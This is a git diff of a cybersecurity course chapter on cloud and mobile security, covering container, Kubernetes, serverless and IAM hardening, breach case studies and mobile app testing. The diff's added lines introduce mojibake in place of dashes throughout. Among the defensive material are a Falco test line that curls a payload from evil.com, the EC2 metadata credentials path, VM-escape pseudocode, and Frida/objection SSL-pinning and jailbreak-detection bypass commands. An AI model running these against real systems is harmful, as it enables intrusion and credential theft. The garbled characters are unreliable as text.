@@ -1,4 +1,4 @@
----
+﻿---
 layout: default
 title: "Chapter 7: Cloud & Mobile Security"
 permalink: /cyber-security/07-cloud-mobile/
@@ -6,8 +6,8 @@ permalink: /cyber-security/07-cloud-mobile/
 
 # Chapter 7: Cloud & Mobile Security
 
-> **Prereq:** Chapter 6 (IAM) — cloud security extends IAM to cloud provider and mobile device identities.
-> **Next:** Chapter 8 (Forensics & IR) — incident response in cloud and mobile environments requires specialised processes.
+> **Prereq:** Chapter 6 (IAM) â€” cloud security extends IAM to cloud provider and mobile device identities.
+> **Next:** Chapter 8 (Forensics & IR) â€” incident response in cloud and mobile environments requires specialised processes.
 
 ---
 
@@ -24,16 +24,16 @@ permalink: /cyber-security/07-cloud-mobile/
 <!-- Image Gallery -->
 <section class="lesson-visuals" aria-label="Visual learning resources">
   <header><span>VISUAL LEARNING</span><h2>See it. Review it. Remember it.</h2></header>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" alt="Handwritten notes" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/07-cloud-mobile/handwritten-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/07-cloud-mobile/handwritten-notes.png" alt="Handwritten notes" loading="lazy">
     <span><strong>Handwritten notes</strong>Condensed notes for deliberate review.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" alt="Sticky-note revision" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/07-cloud-mobile/sticky-notes.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/07-cloud-mobile/sticky-notes.png" alt="Sticky-note revision" loading="lazy">
     <span><strong>Sticky-note revision</strong>Fast recall prompts for revision.</span>
   </a>
-  <a class="lesson-visual-card" href="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" target="_blank" rel="noopener">
-    <img src="../../../assets/images/lessons/cyber-security/07-cloud-mobile/.png" alt="Visual concept guide" loading="lazy">
+  <a class="lesson-visual-card" href="../../assets/images/lessons/cyber-security/07-cloud-mobile/visual-explanation.png" target="_blank" rel="noopener">
+    <img src="../../assets/images/lessons/cyber-security/07-cloud-mobile/visual-explanation.png" alt="Visual concept guide" loading="lazy">
     <span><strong>Visual concept guide</strong>A connected explanation of the key ideas.</span>
   </a>
 </section>
@@ -78,14 +78,14 @@ flowchart LR
 
 ### 1. Infrastructure as a Service (IaaS)
 
-**Analogy:** Renting an apartment — the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data).
+**Analogy:** Renting an apartment â€” the landlord provides the building shell and plumbing (hypervisor, hardware, network). You bring your own furniture, paint the walls, and fix your leaky faucet (OS, middleware, apps, data).
 
 **What YOU secure:** Applications, data, runtime, OS, middleware, network config (security groups, ACLs).
 **What provider secures:** Physical datacenter, hardware, storage, networking, hypervisor.
 
-**Example — AWS EC2:**
+**Example â€” AWS EC2:**
 ```bash
-# IaaS — you manage the AMI, OS patches, firewall rules
+# IaaS â€” you manage the AMI, OS patches, firewall rules
 aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.large --security-group-ids sg-12345
 aws ec2 create-security-group --group-name web-sg --description "Web tier security group"
 aws ec2 authorize-security-group-ingress --group-name web-sg --protocol tcp --port 443 --cidr 0.0.0.0/0
@@ -93,24 +93,24 @@ aws ec2 authorize-security-group-ingress --group-name web-sg --protocol tcp --po
 
 ### 2. Platform as a Service (PaaS)
 
-**Analogy:** Renting a fully furnished apartment — the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data).
+**Analogy:** Renting a fully furnished apartment â€” the landlord provides furniture, appliances, and utilities. You just bring your clothes and cook your food (your application code and data).
 
 **What YOU secure:** Application code, data, access configuration (IAM, secrets).
 **What provider secures:** Runtime, middleware, OS, hypervisor, hardware, networking.
 
-**Example — AWS Elastic Beanstalk:**
+**Example â€” AWS Elastic Beanstalk:**
 ```bash
-# PaaS — provider handles OS, runtime, web server
+# PaaS â€” provider handles OS, runtime, web server
 aws elasticbeanstalk create-application --application-name my-app
 aws elasticbeanstalk create-environment --application-name my-app --environment-name prod --solution-stack-name "64bit Amazon Linux 2 v5.8.4 running Node.js 18"
 ```
 
 ### 3. Software as a Service (SaaS)
 
-**Analogy:** Staying at a hotel — everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies).
+**Analogy:** Staying at a hotel â€” everything is provided. You just use the service. You're responsible for keeping your room locked (your data, user accounts, access policies).
 
 **What YOU secure:** Data classification, user access management (IAM), client-side security.
-**What provider secures:** Everything below data — application, runtime, OS, middleware, hardware, networking.
+**What provider secures:** Everything below data â€” application, runtime, OS, middleware, hardware, networking.
 
 ### Responsibility Comparison Table
 
@@ -127,7 +127,7 @@ aws elasticbeanstalk create-environment --application-name my-app --environment-
 | Networking | Customer | Provider | Provider | Provider |
 | Physical Security | Customer | Provider | Provider | Provider |
 
-**Dry Run — Responsibility Decision Flow:**
+**Dry Run â€” Responsibility Decision Flow:**
 ```
 Input: App deployment scenario (Web app on AWS)
 1. Is it bare metal? ? On-prem (you own everything)
@@ -137,12 +137,12 @@ Input: App deployment scenario (Web app on AWS)
 5. Is it WorkDocs? ? SaaS (provider secures everything, you control access)
 Output: Responsibility assignment matrix
 
-Complexity: O(1) — direct classification
+Complexity: O(1) â€” direct classification
 ```
 
 ### Edge Cases
 
-- **Container services (EKS, AKS, GKE):** Hybrid model — provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server.
+- **Container services (EKS, AKS, GKE):** Hybrid model â€” provider secures control plane, customer secures worker nodes, pods, and container runtime. Responsibility boundary is at the Kubernetes API server.
 - **Serverless (Lambda, Functions):** Provider secures execution environment, customer secures function code, dependencies, and IAM permissions. Cold-start containers are provider-managed.
 - **Shared VPC (GCP Hosted Projects):** Host project owner secures networking, service project owner secures resources. Split responsibility model.
 
@@ -150,7 +150,7 @@ Complexity: O(1) — direct classification
 
 ## Cloud Shared Responsibility Model
 
-### Deep Dive — The Six Layers of Cloud Security
+### Deep Dive â€” The Six Layers of Cloud Security
 
 
 ```
@@ -186,7 +186,7 @@ Layer 6: Governance & Compliance (shared)
 
 **Real-World Analogy:** A bank safety deposit box. The bank secures the vault, the building, and the guards (Security *of* the Cloud). You secure your key and what you put in the box (Security *in* the Cloud). If you leave your box unlocked, the bank isn't responsible.
 
-**Numbered Steps — Determining Responsibility:**
+**Numbered Steps â€” Determining Responsibility:**
 1. Identify the service model (IaaS/PaaS/SaaS) from the deployment type.
 2. Consult the provider's Shared Responsibility Matrix (SRM) document.
 3. For each resource category (compute, storage, network, data, identity), check who has configuration access.
@@ -195,7 +195,7 @@ Layer 6: Governance & Compliance (shared)
 6. Automate compliance checks using CSPM tools (AWS Config, Azure Policy, GCP CSPM).
 7. Re-assess when migrating between service models or adding new services.
 
-**A&D Table — Shared Responsibility Model:**
+**A&D Table â€” Shared Responsibility Model:**
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
@@ -207,7 +207,7 @@ Layer 6: Governance & Compliance (shared)
 
 **Edge Cases:**
 - **AWS Fargate:** Provider manages the runtime and OS; customer manages task definitions, IAM roles, and container images. The boundary is at the container runtime level.
-- **GCP Cloud Run:** Fully managed Knative — provider patches underlying K8s, customer secures service account permissions and container images.
+- **GCP Cloud Run:** Fully managed Knative â€” provider patches underlying K8s, customer secures service account permissions and container images.
 - **Azure AD B2C:** Provider secures the identity platform; customer configures user flows, attribute collection, and API connectors. Shared responsibility for user data.
 
 ---
@@ -230,7 +230,7 @@ Layer 6: Governance & Compliance (shared)
 | Side-Channel | Guest observes host or other guests via shared resources | Spectre/Meltdown (cross-VM cache leaks) |
 | VM Hopping | Guest accesses another guest via shared memory | Memory deduplication attacks |
 
-### VM Escape — Detailed Walkthrough
+### VM Escape â€” Detailed Walkthrough
 
 
 **Step-by-Step Attack Flow:**
@@ -241,9 +241,9 @@ Layer 6: Governance & Compliance (shared)
 5. Attacker gains arbitrary code execution on the host OS.
 6. Attacker accesses other VMs on the same host or the hypervisor control layer.
 
-**Pseudocode — VM Escape Exploit Concept:**
+**Pseudocode â€” VM Escape Exploit Concept:**
 ```
-// Concept — DO NOT USE MALICIOUSLY
+// Concept â€” DO NOT USE MALICIOUSLY
 function attemptVmEscape():
     # Step 1: Detect hypervisor
     if cpuid(hypervisor_present) == true:
@@ -261,7 +261,7 @@ function attemptVmEscape():
 ```
 
 **Complexity Analysis:**
-- **Detection phase:** O(1) — single CPUID instruction
+- **Detection phase:** O(1) â€” single CPUID instruction
 - **Vulnerability probing:** O(n) where n = number of known CVEs
 - **Exploit execution:** Depends on exploit complexity
 - **Memory access after escape:** O(1) once kernel access gained
@@ -278,11 +278,11 @@ function attemptVmEscape():
 | Ghost VMs (unauthorized) | Hidden attack surface | Cloud inventory scanning (AWS Config) |
 
 **Edge Cases:**
-- **Nested virtualization:** Running a hypervisor inside a VM (common for training, containers-on-VM). Additional isolation concerns — can be exploited for hyperjacking.
+- **Nested virtualization:** Running a hypervisor inside a VM (common for training, containers-on-VM). Additional isolation concerns â€” can be exploited for hyperjacking.
 - **Hardware pass-through (PCIe, GPU):** Direct device assignment bypasses hypervisor mediation. Malicious DMA attacks possible without IOMMU.
-- **Memory ballooning:** Hypervisor reclaims guest memory — potential information leak if memory isn't zeroed before reassignment.
+- **Memory ballooning:** Hypervisor reclaims guest memory â€” potential information leak if memory isn't zeroed before reassignment.
 
-### A&D Table — Virtualization Security
+### A&D Table â€” Virtualization Security
 
 
 | Aspect | Advantages | Disadvantages |
@@ -349,10 +349,10 @@ docker run --pid=host --net=host --cap-add=audit_control \
 # [FAIL] 5.4 - Ensure privileged containers are not used
 ```
 
-**Complexity Analysis — Docker Security:**
+**Complexity Analysis â€” Docker Security:**
 - **docker-bench-security scan:** O(n) where n = number of test checks (~100 checks)
 - **Image vulnerability scan (Trivy):** O(p + v) where p = packages, v = vulnerability DB entries
-- **seccomp profile filtering:** O(1) per syscall — kernel overhead at syscall boundary
+- **seccomp profile filtering:** O(1) per syscall â€” kernel overhead at syscall boundary
 
 ### Trivy Container Image Scanning
 
@@ -375,7 +375,7 @@ trivy filesystem --severity HIGH /path/to/container/rootfs
 trivy k8s cluster --severity CRITICAL
 ```
 
-**Dry Run — Trivy Scan Output Interpretation:**
+**Dry Run â€” Trivy Scan Output Interpretation:**
 ```
 Input: trivy image nginx:1.21.6
 Scan starts ?
@@ -388,7 +388,7 @@ Scan starts ?
 Output: 2 CRITICAL, 1 HIGH vulnerability found
 ```
 
-### Docker Security — Edge Cases
+### Docker Security â€” Edge Cases
 
 
 - **Rootless Docker (dockerd-rootless):** Docker daemon runs without root privileges. Prevents daemon compromise from escalating to host root. Requires cgroup v2 and specific configuration.
@@ -400,7 +400,7 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 
 ## Kubernetes Security
 
-**Analogy:** A naval fleet. The control plane (API server, etcd) is the command ship. Each worker node is a warship. Pods are crew squads. RBAC policies are security clearances. Network policies are radio frequencies — only authorized units can communicate. Secrets are classified documents locked in the captain's safe.
+**Analogy:** A naval fleet. The control plane (API server, etcd) is the command ship. Each worker node is a warship. Pods are crew squads. RBAC policies are security clearances. Network policies are radio frequencies â€” only authorized units can communicate. Secrets are classified documents locked in the captain's safe.
 
 ### Kubernetes Attack Surface
 
@@ -419,7 +419,7 @@ Output: 2 CRITICAL, 1 HIGH vulnerability found
 ### RBAC (Role-Based Access Control)
 
 
-**Pseudocode — RBAC Configuration Pattern:**
+**Pseudocode â€” RBAC Configuration Pattern:**
 ```
 Principle: Least privilege for every identity
 Entities: User, Group, ServiceAccount
@@ -480,7 +480,7 @@ kubectl run nginx --image=nginx  # Should be blocked if restricted
 #   - seccompProfile not set to RuntimeDefault or Localhost
 ```
 
-**Dry Run — Pod Admission with PSS:**
+**Dry Run â€” Pod Admission with PSS:**
 ```
 Input: Pod spec requesting privileged=true, hostPID=true
 1. API server receives Pod creation request
@@ -530,8 +530,8 @@ kubectl run test --image=alpine --rm -it -- wget -qO- http://backend-svc.product
 # Expected: connection timeout (blocked by network policy)
 ```
 
-**Complexity Analysis — Network Policies:**
-- **Policy creation:** O(1) — declarative YAML
+**Complexity Analysis â€” Network Policies:**
+- **Policy creation:** O(1) â€” declarative YAML
 - **Apply to cluster:** O(n) where n = number of pods affected
 - **Packet filtering overhead:** O(p) per packet where p = number of matching policies
 - **Convergence time:** Seconds (iptables rules updated on each node)
@@ -639,7 +639,7 @@ kubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- node
 ### Falco Runtime Security
 
 
-**Analogy:** A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior — like someone trying to open the server room door at 3 AM.
+**Analogy:** A security guard watching every door, window, and hallway in real-time. Falco monitors system calls from the kernel and alerts on suspicious behavior â€” like someone trying to open the server room door at 3 AM.
 
 **Falco Rule Structure:**
 ```yaml
@@ -694,18 +694,18 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 # (user=root container_id=abc123 image=alpine shell=sh pid=42)
 ```
 
-**Complexity Analysis — Falco:**
-- **Syscall monitoring:** O(1) per syscall — kernel-level event notification
+**Complexity Analysis â€” Falco:**
+- **Syscall monitoring:** O(1) per syscall â€” kernel-level event notification
 - **Rule evaluation:** O(n) where n = number of rules per event
 - **Performance overhead:** 1-3% CPU on typical workloads
 - **Alert throughput:** Hundreds of thousands of events per second
 
-### A&D Table — Container Security
+### A&D Table â€” Container Security
 
 
 | Aspect | Advantages | Disadvantages |
 |--------|-----------|---------------|
-| Isolation | Lightweight vs VMs | Shared kernel — less isolation |
+| Isolation | Lightweight vs VMs | Shared kernel â€” less isolation |
 | Image scanning | Catch CVEs pre-deployment | False positives, stale DB |
 | RBAC | Fine-grained access control | Complex to manage at scale |
 | Network policies | Micro-segmentation | Overhead on pod startup |
@@ -747,7 +747,7 @@ docker run --rm -it alpine sh -c "apk add curl && curl http://evil.com/payload"
 | 9 | Excessive Permissions | Overly broad IAM roles (wildcard actions) | IAM policy simulation, Access Analyzer |
 | 10 | Business Logic Flaws | Account creation abuse, coupon misuse | Rate limiting, idempotency tokens |
 
-### Event Injection — Deep Dive
+### Event Injection â€” Deep Dive
 
 
 **Attack Flow:**
@@ -798,16 +798,16 @@ exports.handler = async (event, context) => {
 };
 ```
 
-**Complexity Analysis — Serverless Security:**
+**Complexity Analysis â€” Serverless Security:**
 - **Input validation:** O(n) where n = payload field count
-- **IAM authorization lookup:** O(1) — AWS Cognito lookup
-- **Secrets retrieval:** O(1) — cached after first invocation
+- **IAM authorization lookup:** O(1) â€” AWS Cognito lookup
+- **Secrets retrieval:** O(1) â€” cached after first invocation
 - **Cold start overhead:** 100-500ms additional (JVM: up to 6 seconds)
 
-### Edge Cases — Serverless
+### Edge Cases â€” Serverless
 
 
-- **Event source replay:** SQS events are retried. Ensure idempotency — same event processed twice should produce same result.
+- **Event source replay:** SQS events are retried. Ensure idempotency â€” same event processed twice should produce same result.
 - **Warm container reuse:** Environment variables from previous invocation persist. Never store per-request secrets in mutable global state.
 - **Side-effect cleanup:** Temporary file writes in `/tmp` persist across invocations. Always clean up sensitive files.
 - **Function chaining:** Lambda invoking Lambda. Deep chains increase blast radius and make tracing difficult. Use Step Functions instead.
@@ -828,27 +828,27 @@ The Center for Internet Security (CIS) publishes benchmark documents with prescr
 | Azure Foundations | ~120+ | Azure AD, RBAC, storage, networking |
 | GCP Foundations | ~100+ | IAM, GCS, GKE, networking, logging |
 
-**AWS CIS Benchmark — Top Recommendations:**
+**AWS CIS Benchmark â€” Top Recommendations:**
 ```bash
-# 1.1 — Avoid root user usage
+# 1.1 â€” Avoid root user usage
 aws iam get-account-summary
 aws iam get-credential-report
 
-# 1.3 — Enable IAM password policy
+# 1.3 â€” Enable IAM password policy
 aws iam update-account-password-policy --minimum-password-length 14 \
   --require-uppercase-characters --require-lowercase-characters \
   --require-numbers --require-symbols --max-password-age 90
 
-# 2.1 — Enable CloudTrail in all regions
+# 2.1 â€” Enable CloudTrail in all regions
 aws cloudtrail create-trail --name cis-cloudtrail --s3-bucket-name my-cis-logs \
   --is-multi-region-trail --enable-log-file-validation
 
-# 3.1 — Enable CloudWatch for unauthorized API calls
+# 3.1 â€” Enable CloudWatch for unauthorized API calls
 aws logs put-metric-filter --log-group-name CloudTrail/DefaultLogGroup \
   --filter-name UnauthorizedAPICalls \
   --filter-pattern '{ ($.errorCode = "*UnauthorizedOperation") || ($.errorCode = "AccessDenied*") }'
 
-# 4.1 — Restrict security group access
+# 4.1 â€” Restrict security group access
 aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0'
 ```
 
@@ -923,7 +923,7 @@ CIEM focuses on managing cloud IAM permissions at scale.
 | Cross-account access | Monitor role chaining paths | IAM Access Analyzer |
 | Anomaly detection | Flag unusual API calls | UEBA on CloudTrail |
 
-**A&D Table — Cloud Security Tools:**
+**A&D Table â€” Cloud Security Tools:**
 
 | Tool Category | Advantages | Disadvantages |
 |---------------|-----------|---------------|
@@ -936,12 +936,12 @@ CIEM focuses on managing cloud IAM permissions at scale.
 
 ## Cloud IAM Best Practices
 
-**Analogy:** A corporate office building. IAM is the badge system — who can enter which floors, which rooms, and at what times. Just because someone works on Floor 3 doesn't mean they can access the CEO's office on Floor 10.
+**Analogy:** A corporate office building. IAM is the badge system â€” who can enter which floors, which rooms, and at what times. Just because someone works on Floor 3 doesn't mean they can access the CEO's office on Floor 10.
 
 ### Principle #1: Least Privilege
 
 
-**Numbered Steps — Implementing Least Privilege:**
+**Numbered Steps â€” Implementing Least Privilege:**
 1. Start with a deny-all policy (implicit deny).
 2. Identify the minimum permissions required for each role.
 3. Use AWS Managed Policies as starting points, then narrow to custom policies.
@@ -1008,7 +1008,7 @@ aws accessanalyzer list-findings --analyzer-arn arn:aws:access-analyzer:us-east-
 # - IAM role can be assumed by a different account
 ```
 
-**Dry Run — Access Analyzer Policy Check:**
+**Dry Run â€” Access Analyzer Policy Check:**
 ```
 Input: S3 bucket policy allowing public access
 1. Access Analyzer scans bucket policies
@@ -1020,15 +1020,15 @@ Input: S3 bucket policy allowing public access
 Output: Finding created with remediation steps
 ```
 
-**Complexity Analysis — Cloud IAM:**
+**Complexity Analysis â€” Cloud IAM:**
 - **Policy evaluation (AWS):** O(s) where s = number of statements in policy. Deny wins over Allow. Explicit Deny beats Allow beats Implicit Deny.
 - **Access Analyzer scan:** O(r + p) where r = number of resources, p = number of policies per resource
 - **Policy simulation:** O(n * s) where n = actions simulated, s = statements evaluated
 
-### Edge Cases — Cloud IAM
+### Edge Cases â€” Cloud IAM
 
 
-- **Resource-based policies (S3 bucket policy + IAM user policy):** Combined evaluation — granted if EITHER policy allows (AND there's no explicit Deny). Confusing behavior for new cloud engineers.
+- **Resource-based policies (S3 bucket policy + IAM user policy):** Combined evaluation â€” granted if EITHER policy allows (AND there's no explicit Deny). Confusing behavior for new cloud engineers.
 - **Cross-account roles:** Trust policy (in target account) + permissions policy. Both must be configured correctly. Sts:AssumeRole required.
 - **Service control policies (SCP) in AWS Organizations:** SCPs are deny-by-default for member accounts. Even if IAM allows, SCP can block.
 - **PassRole permission:** Required for EC2/ECS/Lambda to assume a role. If missing, resource can't start. If overly broad, privilege escalation risk.
@@ -1136,13 +1136,13 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 }
 ```
 
-**Complexity Analysis — Envelope Encryption:**
-- **Encryption setup:** O(1) — one KMS API call + one AES operation
-- **Decryption setup:** O(1) — one KMS API call + one AES operation
+**Complexity Analysis â€” Envelope Encryption:**
+- **Encryption setup:** O(1) â€” one KMS API call + one AES operation
+- **Decryption setup:** O(1) â€” one KMS API call + one AES operation
 - **Bulk data encryption:** O(n) where n = data size
-- **KEK rotation:** O(1) — re-encrypt DEK with new KEK
+- **KEK rotation:** O(1) â€” re-encrypt DEK with new KEK
 
-### A&D Table — Cloud Data Protection
+### A&D Table â€” Cloud Data Protection
 
 
 | Approach | Advantages | Disadvantages |
@@ -1153,17 +1153,17 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 | Client-side encryption | End-to-end security | Key management complexity |
 | HSM | Tamper-resistant, compliance | High cost, slower operations |
 
-### Edge Cases — Cloud Data Protection
+### Edge Cases â€” Cloud Data Protection
 
 
 - **KMS key deletion:** Keys have a 7-30 day waiting period. Once deleted, all data encrypted with that key is permanently inaccessible.
 - **Cross-region KMS:** KMS keys are region-specific. To encrypt data in multiple regions, use multi-Region keys or re-encrypt with each region's key.
-- **Key policy vs IAM policy:** Key policies directly attach to KMS keys. IAM policies control which users can call KMS APIs. Both can grant access — the more permissive wins (unless explicit Deny).
+- **Key policy vs IAM policy:** Key policies directly attach to KMS keys. IAM policies control which users can call KMS APIs. Both can grant access â€” the more permissive wins (unless explicit Deny).
 - **Envelope encryption performance:** For small payloads (<1KB), direct KMS encrypt is fine. For large files (>1MB), always use envelope encryption.
 
 ---
 
-## Case Study 1: Capital One 2019 — AWS SSRF Breach
+## Case Study 1: Capital One 2019 â€” AWS SSRF Breach
 
 **Overview:** A former AWS employee exploited a Server-Side Request Forgery (SSRF) vulnerability in Capital One's WAF configuration to steal data of over 100 million customers.
 
@@ -1173,7 +1173,7 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 | Phase | What Happened | Attack Technique |
 |-------|--------------|------------------|
 | Reconnaissance | Attacker scanned Capital One's public-facing IPs | Port scanning |
-| WAF bypass | Attacker discovered ModSecurity WAF was configured to block SSRF attempts — but the WAF itself had a metadata endpoint that could be queried | SSRF via WAF metadata |
+| WAF bypass | Attacker discovered ModSecurity WAF was configured to block SSRF attempts â€” but the WAF itself had a metadata endpoint that could be queried | SSRF via WAF metadata |
 | Metadata exfiltration | Attacker queried the AWS EC2 metadata endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | EC2 IMDSv1 |
 | Role credentials stolen | Retrieved the IAM role credentials for the WAF server role | IAM credential theft |
 | S3 enumeration | Used compromised credentials to list S3 buckets and retrieve data | S3 bucket enumeration |
@@ -1190,7 +1190,7 @@ async function envelopeDecrypt(encryptedData, encryptedKey, iv, tag) {
 | No S3 bucket access logging | Delayed detection | Enable S3 server access logs + CloudTrail |
 | No SCP restricting resource access | Unlimited S3 enumeration | SCP to restrict actions to specific account |
 
-### Mitigation — EC2 IMDSv2 Hardening
+### Mitigation â€” EC2 IMDSv2 Hardening
 
 
 ```bash
@@ -1209,7 +1209,7 @@ aws ec2 modify-instance-metadata-options --instance-id i-12345 \
 
 ---
 
-## Case Study 2: CodeCov 2021 — Container Misconfiguration
+## Case Study 2: CodeCov 2021 â€” Container Misconfiguration
 
 **Overview:** Attackers exploited a misconfigured Docker image build process in CodeCov's CI/CD pipeline to gain access to environment variables containing credentials.
 
@@ -1259,7 +1259,7 @@ COPY --from=builder /app/data.json /app/data.json
 
 ---
 
-## Case Study 3: Kaseya VSA 2021 — REvil Ransomware via VDI/Supply Chain
+## Case Study 3: Kaseya VSA 2021 â€” REvil Ransomware via VDI/Supply Chain
 
 **Overview:** REvil ransomware gang exploited a zero-day in Kaseya VSA (Virtual System Administrator), a remote monitoring and management (RMM) tool used by MSPs. The attack propagated through Kaseya's cloud infrastructure to compromise 60 MSPs and 1,500+ downstream businesses.
 
@@ -1287,16 +1287,16 @@ COPY --from=builder /app/data.json /app/data.json
 
 ---
 
-## Case Study 4: Pegasus (NSO Group) — FORCEDENTRY
+## Case Study 4: Pegasus (NSO Group) â€” FORCEDENTRY
 
-**Overview:** Pegasus spyware from NSO Group used a zero-click exploit (FORCEDENTRY) targeting iMessage on iOS. No user interaction required — the target simply received an iMessage.
+**Overview:** Pegasus spyware from NSO Group used a zero-click exploit (FORCEDENTRY) targeting iMessage on iOS. No user interaction required â€” the target simply received an iMessage.
 
 ### Technical Breakdown
 
 
 | Component | Detail |
 |-----------|--------|
-| Vulnerability | CVE-2021-30860 — integer overflow in CoreGraphics PDF parser |
+| Vulnerability | CVE-2021-30860 â€” integer overflow in CoreGraphics PDF parser |
 | Delivery | iMessage automatically rendered the PDF attachment |
 | Exploitation | Heap corruption -> arbitrary code execution in image processing daemon |
 | Privilege escalation | Kernel exploit (CVE-2021-1782) to escape sandbox |
@@ -1349,24 +1349,24 @@ Hide process (rootkit) -> Exfiltrate data
 ### Android Security Model
 
 
-**Analogy:** A building with individual apartments. Each app is an apartment with its own lock (per-app UID). Android SELinux is the building security guard — even if a tenant leaves their door open, the guard prevents them from entering other apartments.
+**Analogy:** A building with individual apartments. Each app is an apartment with its own lock (per-app UID). Android SELinux is the building security guard â€” even if a tenant leaves their door open, the guard prevents them from entering other apartments.
 
 **Android Security Layers:**
 1. **Linux Kernel:** Process isolation, UID/GID per app.
-2. **SELinux (Enforcing):** MAC (Mandatory Access Control) — defines what each process can access.
+2. **SELinux (Enforcing):** MAC (Mandatory Access Control) â€” defines what each process can access.
 3. **Application Sandbox:** Each app runs as a unique Linux user. Apps can't access other apps' files.
 4. **Permissions System:** Users grant/deny runtime permissions.
 5. **Keystore:** Hardware-backed cryptographic key storage (TEE).
 6. **Verified Boot:** Chain of trust from bootloader to OS.
 7. **Play Integrity API:** Checks device integrity (SafetyNet successor).
 
-**Numbered Steps — Android App Sandbox:**
+**Numbered Steps â€” Android App Sandbox:**
 1. App is installed. Android assigns a unique Linux UID (e.g., u0_a123).
 2. App's files are created in `/data/data/com.example.app/`, owned by that UID.
 3. App runs in a Dalvik/ART process with that UID as the Linux user.
-4. SELinux context `u:r:untrusted_app:s0:c123,c256` is applied — defines allowed operations.
+4. SELinux context `u:r:untrusted_app:s0:c123,c256` is applied â€” defines allowed operations.
 5. Each file access is checked: Linux DAC (UID/GID) first, then SELinux MAC.
-6. App requests permissions (e.g., CAMERA) — user grants at runtime.
+6. App requests permissions (e.g., CAMERA) â€” user grants at runtime.
 7. App accesses camera hardware through Android's permission framework + SELinux policy.
 8. If app tries to access another app's files, Linux DAC denies it (different UID).
 
@@ -1410,7 +1410,7 @@ adb shell dumpsys package com.example.app | grep permissions
 <string>production</string>
 ```
 
-### A&D Table — Android vs iOS Security
+### A&D Table â€” Android vs iOS Security
 
 
 | Aspect | Android | iOS |
@@ -1423,7 +1423,7 @@ adb shell dumpsys package com.example.app | grep permissions
 | Enterprise management | Android Enterprise, Work Profile | MDM, User Enrollment (managed Apple IDs) |
 | Jailbreak/Root | Root access via bootloader unlock | Jailbreak via software exploit only |
 
-### Edge Cases — Mobile Security
+### Edge Cases â€” Mobile Security
 
 
 - **iOS 17+ - Lockdown Mode:** Applies maximum security settings. Disables most web technologies, limits messaging, blocks USB accessories.
@@ -1448,7 +1448,7 @@ adb shell dumpsys package com.example.app | grep permissions
 | M9 | Insecure Authentication Architecture | Weak session management | Session hijacking, replay attacks |
 | M10 | Lack of Binary Protections | No obfuscation, no tamper detection | Repackaging, reverse engineering |
 
-### M1 — Improper Credential Usage
+### M1 â€” Improper Credential Usage
 
 
 ```bash
@@ -1460,7 +1460,7 @@ grep -r "password|secret|apikey" output_dir/ --include="*.java"
 # This is M1 violation - production credentials in source code
 ```
 
-### M5 — Insecure Communication Detection
+### M5 â€” Insecure Communication Detection
 
 
 ```bash
@@ -1482,7 +1482,7 @@ objection -g com.example.app explore
 ios sslpinning disable
 ```
 
-### M7 — Insecure Data Storage Detection
+### M7 â€” Insecure Data Storage Detection
 
 
 ```bash
@@ -1503,7 +1503,7 @@ find /data/data/com.example.app -name "*.db" -exec sqlite3 {} .dump \;
 # Look for: credit card numbers, personal data without encryption
 ```
 
-### M2 — Supply Chain Security
+### M2 â€” Supply Chain Security
 
 
 ```bash
@@ -1541,7 +1541,7 @@ grep -r "su|Superuser|magisk|rootbeer" decompiled_app/
 aapt dump badging app.apk | grep -E "uses-permission|android:debuggable|exported"
 ```
 
-**Dry Run — APK Security Analysis:**
+**Dry Run â€” APK Security Analysis:**
 ```
 Input: app.apk (Android banking app)
 1. Decompile: jadx -d out app.apk -> 45 Java source files
@@ -1628,7 +1628,7 @@ ios jailbreak disable
    # - Insecure data transmission
    ```
 
-**Detection — Certificate Pinning Bypass:**
+**Detection â€” Certificate Pinning Bypass:**
 ```bash
 # Android - Frida SSL pinning bypass
 frida -U -f com.example.app -l ssl-pinning-bypass.js --no-pause
@@ -1715,7 +1715,7 @@ adb shell am start -a android.action.DPM_CMD -e command create_work_profile
 #   - View device location (supervised only)
 ```
 
-### A&D Table — BYOD Models
+### A&D Table â€” BYOD Models
 
 
 | Model | User Privacy | Corporate Security | Complexity |
@@ -1869,14 +1869,14 @@ def validate_app_store_receipt(receipt_data, production=True):
     return True
 ```
 
-**Complexity Analysis — Receipt Validation:**
-- **Client-side only:** O(1) — trivially bypassed by Frida/objection
-- **Server-side validation:** O(1) — one HTTP call, secure
-- **Transaction dedup:** O(1) — lookup in database (indexed by transaction_id)
+**Complexity Analysis â€” Receipt Validation:**
+- **Client-side only:** O(1) â€” trivially bypassed by Frida/objection
+- **Server-side validation:** O(1) â€” one HTTP call, secure
+- **Transaction dedup:** O(1) â€” lookup in database (indexed by transaction_id)
 
 ---
 
-## Practical Examples — Full Command Reference
+## Practical Examples â€” Full Command Reference
 
 ### Cloud IAM Policy Analysis
 
